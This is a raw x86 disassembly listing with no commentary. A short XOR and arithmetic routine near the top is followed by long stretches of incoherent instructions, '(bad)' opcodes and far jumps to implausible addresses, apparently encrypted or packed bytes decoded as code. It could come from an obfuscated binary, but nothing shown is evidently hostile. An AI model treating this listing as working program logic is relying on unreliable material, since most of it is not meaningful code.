  4069f0:	and    edx,DWORD PTR [eax+0x6cad4576]
  4069f6:	iret   
  4069f7:	clc    
  4069f8:	lds    esi,FWORD PTR [esi+0x530a6820]
  4069fe:	adc    DWORD PTR [ebp+0x69],0x63
  406a02:	xor    ebp,DWORD PTR ds:0x1ec67324
  406a08:	pop    esp
  406a09:	mov    cl,BYTE PTR [ebp+0x5b119268]
  406a0f:	rcl    BYTE PTR [edi],1
  406a11:	lahf   
  406a12:	dec    edx
  406a13:	dec    edi
  406a14:	pushf  
  406a15:	push   esi
  406a16:	push   edi
  406a17:	xor    edi,ecx
  406a19:	mov    edi,0xf89f2dae
  406a1e:	mov    DWORD PTR [eax],edi
  406a20:	mov    eax,DWORD PTR [ebp-0x14]
  406a23:	mov    ebx,DWORD PTR [ebp-0x8]
  406a26:	xor    DWORD PTR ds:0x434503,ebx
  406a2c:	mov    ecx,0x7510851
  406a31:	xor    eax,ecx
  406a33:	sbb    esi,DWORD PTR ds:0x43447b
  406a39:	mov    esi,0x327299
  406a3e:	xor    ebx,ecx
  406a40:	add    DWORD PTR ds:0x4344bb,0x434577
  406a4a:	xor    edx,edx
  406a4c:	add    eax,esi
  406a4e:	sbb    DWORD PTR ds:0x43445f,0x1c54
  406a58:	add    ebx,esi
  406a5a:	div    ebx
  406a5c:	mov    DWORD PTR ds:0x4344b7,edi
  406a62:	jmp    0x406e50
  406a67:	inc    ebx
  406a68:	push   ebp
  406a69:	sti    
  406a6a:	sbb    DWORD PTR [ebp-0x49aabca3],0xffffff8a
  406a71:	mov    ds:0xa835edeb,eax
  406a76:	dec    esi
  406a77:	popf   
  406a78:	(bad)  
  406a79:	jle    0x406af9
  406a7b:	dec    edi
  406a7c:	jns    0x406afc
  406a7e:	jle    0x406a0f
  406a80:	inc    ebp
  406a81:	imul   ecx,DWORD PTR [esi],0xfffffffc
  406a84:	adc    esi,DWORD PTR [edi]
  406a86:	data16 clc 
  406a88:	fdiv   DWORD PTR [ebp-0x5a]
  406a8b:	jmp    0x1785:0xd32efd00
  406a92:	mov    edi,0x13d4c4b4
  406a97:	outs   dx,BYTE PTR ds:[esi]
  406a98:	mov    ds:0x5473e7ef,eax
  406a9d:	inc    edi
  406a9e:	(bad)  
  406aa1:	jno    0x406ae4
  406aa3:	data16 adc al,0x64
  406aa6:	lock pop esi
  406aa8:	repnz imul ecx,DWORD PTR [edi+0xe],0xffffff8a
  406aad:	pushf  
  406aae:	dec    edi
  406aaf:	and    eax,0xe3249da1
  406ab4:	inc    ecx
  406ab5:	cmova  ebp,DWORD PTR [ecx+0xbc3762b]
  406abc:	(bad)  
  406abd:	mov    ds:0x6cd10ce2,eax
  406ac2:	push   eax
  406ac3:	sub    eax,0x3e0861c
  406ac8:	mov    WORD PTR [esi],gs
  406aca:	fiadd  WORD PTR [eax]
  406acc:	mov    ecx,DWORD PTR [ecx]
  406ace:	test   ah,bl
  406ad0:	jecxz  0x406a66
  406ad2:	mov    DWORD PTR [ecx+0x5f],esp
  406ad5:	adc    eax,0xbbd30a4c
  406ada:	lods   eax,DWORD PTR ds:[esi]
  406adb:	jne    0x406aa1
  406add:	inc    edi
  406ade:	push   edx
  406ae0:	sahf   
  406ae1:	(bad)
  406ae6:	push   ss
  406ae7:	sub    dl,BYTE PTR [esi-0x719f0db0]
  406aed:	dec    eax
  406aee:	inc    esi
  406aef:	jb     0x406ada
  406af1:	cmp    al,BYTE PTR [esi-0x373590bc]
  406af7:	xchg   esp,eax
  406af8:	mov    al,ds:0x764027d9
  406afd:	pop    ebp
  406afe:	leave  
  406aff:	aad    0x12
  406b01:	pop    edx
  406b02:	pushf  
  406b03:	jne    0x406aa1
  406b05:	cmc    
  406b06:	retf   
  406b07:	mov    bh,cl
  406b09:	in     al,0x90
  406b0b:	pop    edi
  406b0c:	pcmpeqd mm0,QWORD PTR [ebx-0x7460d722]
  406b13:	stc    
  406b14:	aas    
  406b15:	mov    cl,BYTE PTR [ebp-0x7c]
  406b18:	mov    bl,0x7
  406b1a:	pop    ss
  406b1b:	mov    ah,0xee
  406b1d:	sub    al,0xb8
  406b1f:	xor    al,0x16
  406b21:	mov    bh,BYTE PTR [edx+edx*1]
  406b24:	sub    BYTE PTR [bx-0x1fa5],ch
  406b29:	retf   0x8f25
  406b2c:	sub    DWORD PTR [esi-0xd5b5cab],0x5
  406b33:	inc    ebx
  406b34:	sub    DWORD PTR [edi+0x1786520c],eax
  406b3a:	outs   dx,BYTE PTR ds:[esi]
  406b3b:	lock push ss
  406b3d:	ret    0x871b
  406b40:	js     0x406b88
  406b42:	test   BYTE PTR [eax+0x4b],al
  406b45:	jmp    0x542f:0x77577b2b
  406b4c:	test   eax,0x80b202ab
  406b51:	shl    BYTE PTR [esi],1
  406b53:	jns    0x406ba1
  406b55:	retf   0x7ab
  406b58:	or     al,0xf5
  406b5a:	pop    eax
  406b5b:	pop    edi
  406b5c:	mov    dh,0xef
  406b5e:	push   edx
  406b5f:	aad    0x31
  406b61:	lea    ebx,[ecx+0x69]
  406b64:	mov    al,BYTE PTR [ecx+0x47]
  406b67:	cld    
  406b68:	loop   0x406ba6
  406b6a:	(bad)
  406b6d:	cmc    
  406b6e:	add    DWORD PTR [ecx-0x3a769d4a],0xffffffa3
  406b75:	inc    ecx
  406b76:	retf   
  406b77:	shr    DWORD PTR [ebp+0x45285f76],1
  406b7d:	jle    0x406b4c
  406b7f:	adc    eax,0x228bac86
  406b84:	fsub   DWORD PTR [ecx+ebx*8]
  406b87:	xchg   ebx,eax
  406b88:	rcl    BYTE PTR [eax-0x4a64b12e],cl
  406b8e:	adc    DWORD PTR [ecx-0x39],esp
  406b91:	jae    0x406bb0
  406b93:	inc    ebp
  406b94:	lahf   
  406b95:	cdq    
  406b96:	xchg   ebx,eax
  406b97:	mov    ebx,0x8ef18902
  406b9c:	imul   ebp,DWORD PTR [edx],0x76f0efca
  406ba2:	dec    eax
  406ba3:	pop    ss
  406ba4:	in     al,dx
  406ba5:	fst    QWORD PTR [edi]
  406ba7:	xchg   ebp,eax
  406ba8:	test   edi,edx
  406baa:	jno    0x406b63
  406bac:	in     al,dx
  406bad:	mov    BYTE PTR [esi-0xc2f5e80],0xca
  406bb4:	call   0x4d42f5e3
  406bb9:	jnp    0x406bee
  406bbb:	das    
  406bbc:	shl    DWORD PTR [esi],1
  406bbe:	fdivrp st(4),st
  406bc0:	pop    es
  406bc1:	in     al,0x7a
  406bc3:	pop    esi
  406bc4:	js     0x406b4b
  406bc6:	ret    
  406bc7:	inc    ebx
  406bc8:	test   eax,0x88e05ed3
  406bcd:	xor    eax,0xfdc14310
  406bd2:	rcr    DWORD PTR [edi-0x2d1ad999],1
  406bd8:	sub    DWORD PTR [edx-0xa],ebp
  406bdb:	rol    BYTE PTR [edx-0x5780085a],1
  406be1:	std    
  406be2:	push   ebp
  406be3:	les    esp,FWORD PTR [ecx+0x79]
  406be6:	retf   0xfd33
  406be9:	ret    
  406bea:	mov    cl,0xf1
  406bec:	push   ss
  406bed:	test   eax,0x231908f9
  406bf2:	fdiv   st(5),st
  406bf4:	(bad)  
  406bf5:	xchg   ebx,eax
  406bf6:	sub    DWORD PTR [ecx-0x18],edx
  406bf9:	inc    ebx
  406bfa:	ror    DWORD PTR [esi+0x2fff7126],1
  406c00:	mov    ecx,0x1b68f34f
  406c05:	mov    dh,0x26
  406c07:	jne    0x406ba0
  406c09:	ja     0x406c8a
  406c0b:	jns    0x406bba
  406c0d:	xchg   cx,ax
  406c0f:	mov    ds:0x2a9e818e,al
  406c14:	inc    ebx
  406c15:	mov    dh,0x2c
  406c17:	ret    0xe3
  406c1a:	pop    edi
  406c1b:	xchg   ebx,eax
  406c1c:	inc    esi
  406c1d:	gs mov ch,0xc8
  406c20:	mov    BYTE PTR [eax+0x7a429637],bh
  406c26:	test   DWORD PTR [eax-0x6],edi
  406c29:	and    edi,eax
  406c2b:	lods   eax,DWORD PTR ds:[esi]
  406c2c:	mov    ds,WORD PTR [edx-0x53]
  406c2f:	xor    al,0xc0
  406c31:	pop    ebp
  406c32:	arpl   WORD PTR ds:0x2a92e8c5,bp
  406c38:	cmp    BYTE PTR [edi],dh
  406c3a:	xlat   BYTE PTR ds:[ebx]
  406c3b:	pop    ecx
  406c3c:	or     eax,0x5dffb1f5
  406c41:	ins    BYTE PTR es:[edi],dx
  406c42:	les    edx,FWORD PTR ds:[ecx+0xb]
  406c46:	fidivr DWORD PTR [ebp-0xc]
  406c49:	inc    edx
  406c4a:	test   al,0x63
  406c4c:	(bad)  
  406c4d:	push   ebx
  406c4e:	and    edi,ebx
  406c50:	cmp    al,0x3a
  406c52:	sbb    eax,0x89dc4ed6
  406c57:	xchg   ecx,eax
  406c58:	add    DWORD PTR [eax],edi
  406c5a:	mov    edx,edi
  406c5c:	mov    ds:0x7c49a8db,al
  406c61:	push   es
  406c62:	adc    al,0xce
  406c64:	fs mov ebp,0x13e6086
  406c6a:	fcomp  QWORD PTR [edi]
  406c6c:	xlat   BYTE PTR ds:[ebx]
  406c6d:	mov    cl,0xb6
  406c6f:	sub    DWORD PTR [edi+0x40],edx
  406c72:	xor    al,0x36
  406c74:	test   eax,0x6dc8c4e4
  406c79:	sbb    eax,0x43790870
  406c7e:	inc    eax
  406c7f:	leave  
  406c80:	lahf   
  406c81:	xlat   BYTE PTR ds:[ebx]
  406c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c83:	sti    
  406c84:	gs push es
  406c86:	icebp  
  406c87:	sub    DWORD PTR [esi+0x2f9a5ab8],edx
  406c8d:	xchg   BYTE PTR ss:[eax+0x2a],ch
  406c91:	mov    esp,0x7fa24b39
  406c96:	fistp  WORD PTR [ecx+0x4a48ee2d]
  406c9c:	stos   DWORD PTR es:[edi],eax
  406c9d:	push   es
  406c9e:	or     al,0xbf
  406ca0:	frstor ds:0x8777e28c
  406ca6:	jl     0x406cfe
  406ca8:	ficom  WORD PTR [ecx]
  406caa:	popa   
  406cab:	push   edi
  406cac:	xchg   esi,eax
  406cad:	cmp    eax,0xae1de222
  406cb2:	fdiv   DWORD PTR [eax-0x6c]
  406cb5:	fiadd  WORD PTR [edi+0x28]
  406cb8:	inc    edx
  406cb9:	retf   
  406cba:	sub    eax,0xbe6820f6
  406cbf:	push   esi
  406cc0:	mov    dh,0x36
  406cc2:	enter  0x8760,0xd3
  406cc6:	test   al,0x68
  406cc8:	call   0x9465:0xd9d4e210
  406ccf:	aas    
  406cd0:	mov    dh,BYTE PTR [esi-0x143ddfe4]
  406cd6:	mov    DWORD PTR cs:[edi],ebx
  406cd9:	mov    DWORD PTR [esi-0x80],0x62eaafbc
  406ce0:	sub    BYTE PTR [edx-0x1c],bl
  406ce3:	inc    esi
  406ce4:	daa    
  406ce5:	retf   
  406ce6:	fnsave [eax]
  406ce8:	mov    dl,0xfc
  406cea:	adc    dh,BYTE PTR [ebx]
  406cec:	mov    dh,ah
  406cee:	dec    ebx
  406cef:	out    0x82,eax
  406cf1:	lahf   
  406cf2:	fwait
  406cf3:	std    
  406cf4:	lods   eax,DWORD PTR ds:[esi]
  406cf5:	sub    eax,0xf409f4e2
  406cfa:	dec    ecx
  406cfb:	hlt    
  406cfc:	mov    ah,0x4
  406cfe:	inc    esp
  406cff:	imul   ebp,DWORD PTR [edx+0x1146436c],0xcf250219
  406d09:	test   BYTE PTR [esi+0x41da54f1],0x76
  406d10:	pop    edx
  406d11:	fstp   TBYTE PTR [edx]
  406d13:	sub    eax,esp
  406d15:	cs push ebx
  406d17:	lahf   
  406d18:	enter  0xca0d,0xa9
  406d1c:	add    DWORD PTR [ebp-0x6f6c24f9],edi
  406d22:	or     BYTE PTR [esi-0x1d],dl
  406d25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d26:	cwde   
  406d27:	cld    
  406d28:	leave  
  406d29:	sbb    al,BYTE PTR [esi+0x69]
  406d2c:	lods   al,BYTE PTR ds:[esi]
  406d2d:	stos   DWORD PTR es:[edi],eax
  406d2e:	ins    DWORD PTR es:[edi],dx
  406d2f:	imul   edx,DWORD PTR [edx-0x6730dd21],0x19
  406d36:	add    al,0x24
  406d38:	mov    esi,0xe02c3976
  406d3d:	dec    ebp
  406d3e:	repz fstp QWORD PTR [esi-0x52]
  406d42:	sar    bh,cl
  406d44:	sbb    al,0xc6
  406d46:	pop    eax
  406d47:	call   0xe783:0x9b53d551
  406d4e:	test   BYTE PTR [ebx+0x6a],0x77
  406d52:	rcl    BYTE PTR [ebp+0x66],cl
  406d55:	(bad)  
  406d57:	(bad)  
  406d58:	xlat   BYTE PTR ds:[ebx]
  406d59:	xor    bh,ah
  406d5b:	rol    DWORD PTR [eax-0x7db67a4a],cl
  406d61:	inc    ebp
  406d62:	mov    bh,0x6a
  406d64:	outs   dx,DWORD PTR ds:[esi]
  406d65:	shl    dl,1
  406d67:	pop    edi
  406d68:	(bad)  
  406d6a:	push   edi
  406d6b:	dec    ecx
  406d6c:	fisubr WORD PTR [esi]
  406d6e:	xchg   BYTE PTR [edx+0x15ef7a56],dh
  406d74:	inc    edi
  406d75:	pop    ecx
  406d76:	dec    esi
  406d77:	ds pop edi
  406d79:	cmc    
  406d7a:	loopne 0x406d12
  406d7c:	retf   
  406d7d:	add    eax,0x17a335c4
  406d82:	jbe    0x406de9
  406d84:	std    
  406d85:	imul   edi,DWORD PTR ds:[esi+edx*8+0x47d05a10],0x254a3e35
  406d91:	inc    ecx
  406d92:	jp     0x406dd2
  406d94:	push   esi
  406d95:	pop    edx
  406d96:	pop    ebx
  406d97:	and    ebx,DWORD PTR ds:0x84b356ad
  406d9d:	repz cwde 
  406d9f:	mov    ebx,0xf8680447
  406da4:	loop   0x406e1a
  406da6:	add    al,0x35
  406da8:	xor    cl,BYTE PTR [eax+0x58]
  406dab:	std    
  406dac:	add    DWORD PTR [esi+eax*1+0x493584e0],esp
  406db3:	sbb    bh,cl
  406db5:	dec    ebx
  406db6:	cwde   
  406db7:	xor    bh,ah
  406db9:	(bad)  
  406dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dbb:	mov    BYTE PTR ds:0xa2d61d08,bh
  406dc1:	mov    WORD PTR [esi],?
  406dc3:	mov    ebx,0x89f2dacb
  406dc8:	cld    
  406dc9:	inc    esp
  406dca:	pusha  
  406dcb:	cld    
  406dcc:	jge    0x406dd1
  406dce:	jno    0x406da2
  406dd0:	pop    esi
  406dd1:	pop    ss
  406dd2:	or     BYTE PTR [eax+eiz*2],dl
  406dd5:	into   
  406dd6:	mov    ch,0xf3
  406dd8:	test   DWORD PTR [esi],eax
  406dda:	dec    ecx
  406ddb:	fidivr DWORD PTR [edx-0x468e3b38]
  406de1:	(bad)  
  406de2:	hlt    
  406de3:	mov    ebp,0xb05e0a13
  406de8:	adc    eax,eax
  406dea:	rol    DWORD PTR [eax],1
  406dec:	jns    0x406d90
  406dee:	jbe    0x406dcc
  406df0:	in     al,dx
  406df1:	in     al,0x8b
  406df3:	mov    esp,0x2c8aa74e
  406df8:	outs   dx,DWORD PTR ds:[esi]
  406df9:	add    BYTE PTR [edi-0x32],bl
  406dfc:	push   edi
  406dfd:	push   edx
  406dfe:	dec    eax
  406dff:	int    0x21
  406e01:	mov    dl,0x75
  406e03:	push   0x17
  406e05:	mov    al,0xf7
  406e07:	mov    ebp,0x6480be21
  406e0c:	cdq    
  406e0d:	xchg   ebp,eax
  406e0e:	adc    cl,BYTE PTR [esi]
  406e10:	das    
  406e11:	add    bh,BYTE PTR [ebx-0xd31d4df]
  406e17:	mov    ss,esp
  406e19:	je     0x406e14
  406e1b:	cmp    al,0x3a
  406e1d:	inc    esp
  406e1e:	stc    
  406e1f:	mov    dh,0xa9
  406e21:	daa    
  406e22:	jge    0x406dcf
  406e24:	call   0x59ac984d
  406e29:	push   eax
  406e2a:	mov    DWORD PTR [ecx-0x28],ecx
  406e2d:	adc    eax,DWORD PTR [ebp+ebx*2+0xa]
  406e31:	add    al,0x5c
  406e33:	mov    ebx,0xc0cdf8bd
  406e38:	cmc    
  406e39:	and    dl,BYTE PTR [eax+ecx*1+0x36]
  406e3d:	xchg   ebp,eax
  406e3e:	and    ebp,DWORD PTR [esi+0x3c408925]
  406e44:	mov    al,ds:0xc2373481
  406e49:	jmp    0xd702:0x6aad462
  406e50:	mov    edx,DWORD PTR [ebp-0x20]
  406e53:	mov    DWORD PTR ds:0x4344c7,0x7e00
  406e5d:	jmp    0x40724b
  406e62:	xchg   dl,dl
  406e64:	mov    bl,0x98
  406e66:	jae    0x406ec1
  406e68:	popf   
  406e69:	cld    
  406e6a:	ja     0x406e58
  406e6c:	or     dh,BYTE PTR [eax+0x276569f8]
  406e72:	out    dx,al
  406e73:	ret    
  406e74:	jle    0x406ef4
  406e76:	dec    edi
  406e77:	jns    0x406ef7
  406e79:	jle    0x406e4b
  406e7b:	dec    edx
  406e7c:	call   0x23c9:0x4090a8cc
  406e83:	push   eax
  406e84:	jl     0x406ec7
  406e86:	aas    
  406e87:	loopne 0x406e22
  406e89:	(bad)  
  406e8b:	pop    edx
  406e8c:	sub    ch,0x1b
  406e8f:	push   edx
  406e90:	cmp    al,0xe0
  406e92:	push   ecx
  406e93:	out    0x54,al
  406e95:	inc    edx
  406e96:	jnp    0x406e71
  406e98:	dec    edi
  406e99:	popa   
  406e9a:	shl    BYTE PTR [eax+ecx*4-0x15],0x14
  406e9f:	pushf  
  406ea0:	lods   al,BYTE PTR ds:[esi]
  406ea1:	cmp    al,BYTE PTR [edx+0x6]
  406ea4:	dec    edi
  406ea5:	jle    0x406f0a
  406ea7:	mov    cl,0x10
  406ea9:	push   ss
  406eaa:	pop    ebp
  406eab:	int3   
  406eac:	in     eax,0xad
  406eae:	jmp    0x79ba8ec1
  406eb3:	xor    eax,0x3a05fcc3
  406eb8:	loopne 0x406e55
  406eba:	popf   
  406ebb:	jecxz  0x406e6f
  406ebd:	cmp    al,dl
  406ebf:	mov    esp,0x970d5ea3
  406ec4:	out    dx,eax
  406ec5:	dec    esp
  406ec6:	jle    0x406f3a
  406ec8:	sub    BYTE PTR ds:0x3a6427f0,bl
  406ece:	mov    esi,0x37348154
  406ed3:	push   ebp
  406ed4:	dec    ebp
  406ed5:	imul   ecx,esi,0x422bf086
  406edb:	ds leave 
  406edd:	fsubr  st(2),st
  406edf:	mov    cl,BYTE PTR [ebx-0x2c]
  406ee2:	push   esi
  406ee3:	mov    DWORD PTR [esi-0x7a],esi
  406ee6:	push   esp
  406ee7:	hlt    
  406ee8:	(bad)  
  406ee9:	rcr    DWORD PTR [edx-0x21ccdc3f],1
  406eef:	mov    ecx,0xb5ea418a
  406ef4:	loopne 0x406f09
  406ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ef7:	push   ebp
  406ef8:	pop    edi
  406ef9:	rcl    BYTE PTR [eax+0x2f84de3d],1
  406eff:	inc    esi
  406f00:	mov    al,BYTE PTR [esi-0x4df596e2]
  406f06:	mov    DWORD PTR [ebp+0x3670c6ff],eax
  406f0c:	call   0xea2a8361
  406f11:	(bad)  
  406f12:	mov    bl,0x88
  406f14:	xchg   esi,eax
  406f15:	xor    DWORD PTR [edx+0x1cce4a4a],edx
  406f1b:	lods   al,BYTE PTR ds:[esi]
  406f1c:	or     DWORD PTR [edx],ebx
  406f1e:	jp     0x406f78
  406f20:	sub    DWORD PTR [eax+0x343f08d9],edi
  406f26:	sub    eax,0x1d412acb
  406f2b:	aam    0xe7
  406f2d:	or     eax,0xc5e27fce
  406f32:	and    eax,0x300b90fe
  406f37:	and    eax,0x47cfb1a4
  406f3c:	add    al,bl
  406f3e:	ds xor al,0x67
  406f41:	add    edi,DWORD PTR [esi+0x31]
  406f44:	push   0x5c
  406f46:	sbb    eax,0x563845da
  406f4b:	ds add al,0x80
  406f4e:	inc    ebp
  406f4f:	cwde   
  406f50:	add    BYTE PTR [ebp+0x2ad912cb],bh
  406f56:	in     eax,0xe4
  406f58:	neg    BYTE PTR [ecx+ebp*1+0x7c]
  406f5c:	fistp  DWORD PTR [edi+0x6645ef17]
  406f62:	leave  
  406f63:	stos   DWORD PTR es:[edi],eax
  406f64:	jo     0x406eec
  406f66:	fistp  DWORD PTR [edx]
  406f68:	js     0x406fb6
  406f6a:	retf   0xb1b4
  406f6d:	or     dl,BYTE PTR [edi+0x55]
  406f70:	jo     0x406eff
  406f72:	lahf   
  406f73:	and    eax,0xfd10f424
  406f78:	mov    eax,ds:0x47bc539
  406f7d:	retf   
  406f7e:	js     0x406fb3
  406f80:	cmp    al,0xc4
  406f82:	jl     0x406f8c
  406f84:	fnstenv [eax]
  406f86:	jmp    0xbf71:0x8550e4be
  406f8d:	fcmovu st,st(3)
  406f8f:	dec    esp
  406f90:	adc    al,0x41
  406f92:	push   0x5b
  406f94:	sub    bh,0x34
  406f97:	add    DWORD PTR [esi-0xd],esp
  406f9a:	bound  edx,QWORD PTR [edi]
  406f9c:	loopne 0x406f75
  406f9e:	xchg   esi,eax
  406f9f:	bound  esi,QWORD PTR [edi-0x29]
  406fa2:	fistp  DWORD PTR ds:0x106f027
  406fa8:	imul   esi,DWORD PTR [ebp-0x18a7486c],0xffffffea
  406faf:	mov    eax,0x98642ea
  406fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fb5:	ret    0xe929
  406fb8:	push   0x29
  406fba:	and    al,0x9
  406fbc:	push   ebx
  406fbd:	jnp    0x406f64
  406fbf:	xchg   ebx,eax
  406fc0:	std    
  406fc1:	push   ss
  406fc2:	ret    0x6692
  406fc5:	sbb    BYTE PTR [ecx+0x1b3dc0e],dl
  406fcb:	fcomp  QWORD PTR [ebp-0x1c715ced]
  406fd1:	xchg   BYTE PTR [esi+0x3f],ch
  406fd4:	leave  
  406fd5:	pop    edi
  406fd6:	sti    
  406fd7:	xchg   edx,eax
  406fd8:	repz stc 
  406fda:	into   
  406fdb:	test   DWORD PTR [eax],eax
  406fdd:	jmp    0x406f85
  406fdf:	iret   
  406fe0:	push   0x523c3937
  406fe5:	xor    BYTE PTR [ebp+0x21],ah
  406fe8:	sbb    ah,BYTE PTR [edx-0x14]
  406feb:	mov    ch,0x56
  406fed:	fisubr WORD PTR [ebx-0x30]
  406ff0:	pop    edx
  406ff1:	rcr    BYTE PTR [ebx-0x25aee3fe],0x29
  406ff8:	outs   dx,BYTE PTR gs:[esi]
  406ffa:	sahf   
  406ffb:	lods   eax,DWORD PTR ds:[esi]
  406ffc:	es pop es
  406ffe:	ja     0x407024
  407000:	int    0x6c
  407002:	mov    esp,0xf8bf8c05
  407007:	ficom  DWORD PTR [ebx+0x56]
  40700a:	mov    ch,0xd3
  40700c:	(bad)  
  40700d:	loope  0x406fe0
  40700f:	rol    al,0x35
  407012:	ss cmp bl,al
  407015:	fwait
  407016:	stos   BYTE PTR es:[edi],al
  407017:	stc    
  407018:	aas    
  407019:	retf   0x6483
  40701c:	idiv   DWORD PTR [ebx]
  40701e:	adc    eax,0x339b109
  407023:	lahf   
  407024:	mov    eax,0xbf13347a
  407029:	(bad)  
  40702a:	stos   BYTE PTR es:[edi],al
  40702b:	jle    0x407089
  40702d:	push   es
  40702e:	rcl    DWORD PTR [eax-0x12],cl
  407031:	(bad)  
  407032:	fisttp DWORD PTR [edx-0x7c]
  407035:	push   es
  407036:	pop    esp
  407037:	cmp    eax,0x9be925b9
  40703c:	iret   
  40703d:	pusha  
  40703e:	adc    BYTE PTR ds:0xfc1ff4bf,0x78
  407045:	inc    ecx
  407046:	sti    
  407047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407048:	pushf  
  407049:	sti    
  40704a:	gs push edx
  40704c:	jle    0x4070ca
  40704e:	sahf   
  40704f:	add    DWORD PTR [edi],esp
  407051:	mov    es,WORD PTR [ecx*8-0x28d90fb8]
  407058:	lahf   
  407059:	xchg   ebp,eax
  40705a:	adc    al,0x73
  40705c:	sub    DWORD PTR [esi+0x61],edx
  40705f:	adc    al,0xe5
  407061:	cmp    eax,0xc541e3bd
  407066:	mov    al,0x4b
  407068:	add    DWORD PTR [ecx+0x21bfd97e],0x36
  40706f:	ja     0x407004
  407071:	cmp    edx,ebp
  407073:	shl    DWORD PTR [eax],0x8d
  407076:	sahf   
  407077:	loop   0x4070bf
  407079:	lea    ecx,[edi]
  40707b:	popa   
  40707c:	or     BYTE PTR [ecx],ah
  40707e:	xchg   ebp,eax
  40707f:	inc    esi
  407080:	cmc    
  407081:	xchg   esi,eax
  407082:	(bad)  
  407083:	jecxz  0x4070ca
  407085:	mov    ecx,0xc02f1d90
  40708a:	add    edx,ebx
  40708c:	mov    DWORD PTR [eax-0x719df2d4],eax
  407092:	das    
  407093:	push   eax
  407094:	adc    cl,BYTE PTR [esi+esi*4-0x66]
  407098:	mov    ds:0x17580520,eax
  40709d:	push   esp
  40709e:	add    ecx,DWORD PTR [edi]
  4070a0:	pop    ebp
  4070a1:	push   edx
  4070a2:	jle    0x4070b9
  4070a4:	mov    BYTE PTR [ebp-0x34cdfd5e],ah
  4070aa:	xchg   ecx,eax
  4070ab:	jp     0x407056
  4070ad:	lods   al,BYTE PTR ss:[esi]
  4070af:	mov    ch,0x49
  4070b1:	out    dx,eax
  4070b2:	daa    
  4070b3:	loop   0x4070d7
  4070b5:	cwde   
  4070b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070b7:	and    al,0xf9
  4070b9:	mov    esp,0x6c775af
  4070be:	jp     0x4070bb
  4070c0:	out    0x49,eax
  4070c2:	or     al,0xe6
  4070c4:	push   es
  4070c5:	test   BYTE PTR [eax+eiz*4-0xa],bl
  4070c9:	dec    esp
  4070ca:	imul   esi,DWORD PTR [ebx+0x7a1ed53e],0xd4043f18
  4070d4:	xchg   DWORD PTR [eax],esi
  4070d6:	push   ss
  4070d7:	dec    eax
  4070d8:	or     DWORD PTR [ebx+0x53ac0907],esp
  4070de:	das    
  4070df:	ret    0x6302
  4070e2:	ins    DWORD PTR es:[edi],dx
  4070e3:	push   ecx
  4070e4:	fist   DWORD PTR [edx]
  4070e6:	sbb    ecx,DWORD PTR [eax+0x12]
  4070e9:	leave  
  4070ea:	aam    0x19
  4070ec:	or     DWORD PTR ds:[ebp+eax*8+0x53],edx
  4070f1:	call   0x1125e54d
  4070f6:	sub    al,0xb1
  4070f8:	push   cs
  4070f9:	je     0x407129
  4070fb:	ret    0x1dd8
  4070fe:	push   esi
  4070ff:	xchg   ebp,eax
  407100:	mov    dh,0xf5
  407102:	leave  
  407103:	jo     0x40710c
  407105:	lods   al,BYTE PTR ds:[esi]
  407106:	mov    edi,0x1cb84551
  40710b:	xor    eax,0xa39e4060
  407110:	mov    edx,0x7fe0e0c
  407115:	mov    esp,0x7b0edde0
  40711a:	push   cs
  40711b:	xor    al,0xea
  40711d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40711e:	div    DWORD PTR [eax-0x726598cf]
  407124:	push   esp
  407125:	sbb    DWORD PTR [ebp-0x61],eax
  407128:	inc    edx
  407129:	cld    
  40712a:	jns    0x40711b
  40712c:	ins    DWORD PTR es:[edi],dx
  40712d:	inc    ebp
  40712e:	xlat   BYTE PTR ds:[ebx]
  40712f:	xchg   ebp,eax
  407130:	rcl    DWORD PTR [edi+0x4dc80699],0x0
  407137:	out    dx,al
  407138:	xchg   DWORD PTR [eax-0x2129b628],edx
  40713e:	iret   
  40713f:	(bad)  
  407140:	mov    ds:0x36709019,al
  407145:	js     0x40715c
  407147:	ss in  al,dx
  407149:	cmp    ebp,eax
  40714b:	stos   DWORD PTR es:[edi],eax
  40714c:	sbb    edi,ebx
  40714e:	or     eax,DWORD PTR [edi+eiz*2]
  407151:	fdivr  DWORD PTR [ebx+0x17efb168]
  407157:	or     dl,bl
  407159:	adc    eax,0xe40cdae4
  40715e:	stos   DWORD PTR es:[edi],eax
  40715f:	out    dx,eax
  407160:	(bad)  
  407161:	dec    edi
  407162:	pop    es
  407163:	sbb    edx,DWORD PTR [ebx-0x73522ef2]
  407169:	out    dx,eax
  40716a:	push   esi
  40716b:	jbe    0x407138
  40716d:	data16 jg 0x4071c4
  407170:	add    ebx,DWORD PTR [edx]
  407172:	into   
  407173:	adc    DWORD PTR [ecx],ebp
  407175:	adc    dl,BYTE PTR [edx+0x268c5a83]
  40717b:	or     ebp,eax
  40717d:	(bad)  [edx+0x69fa025]
  407183:	sbb    ah,ch
  407185:	and    BYTE PTR [ebx-0x26],dh
  407188:	push   edi
  407189:	cli    
  40718a:	repz mov edx,DWORD PTR [eax+ebp*4-0x76]
  40718f:	and    al,BYTE PTR [esi-0x59]
  407192:	pop    ds
  407193:	rcr    DWORD PTR [esi+0x2],1
  407196:	mov    ah,0x7f
  407198:	adc    DWORD PTR [eax+0x23],ebx
  40719b:	pop    es
  40719c:	fisub  WORD PTR [eax-0x8]
  40719f:	loope  0x4071be
  4071a1:	xor    ebx,DWORD PTR [eax-0xaab3e99]
  4071a7:	sbb    dh,ch
  4071a9:	mov    ss,WORD PTR [eax-0x20]
  4071ac:	jmp    0xeab4:0xcd447678
  4071b3:	out    dx,eax
  4071b4:	push   cs
  4071b5:	add    eax,0xb5c53467
  4071ba:	popf   
  4071bb:	stc    
  4071bc:	and    eax,0x79f69dec
  4071c1:	ja     0x40716e
  4071c3:	xor    DWORD PTR [ebx+0x57b8b092],ebx
  4071c9:	or     edx,esi
  4071cb:	jp     0x40715e
  4071cd:	add    eax,0xb15ae5a8
  4071d2:	das    
  4071d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071d4:	fwait
  4071d5:	mov    dh,0x25
  4071d7:	sbb    eax,DWORD PTR ds:0xf8db49e6
  4071dd:	xchg   ebp,eax
  4071de:	bound  edi,QWORD PTR [esi+0x3dc1b0a6]
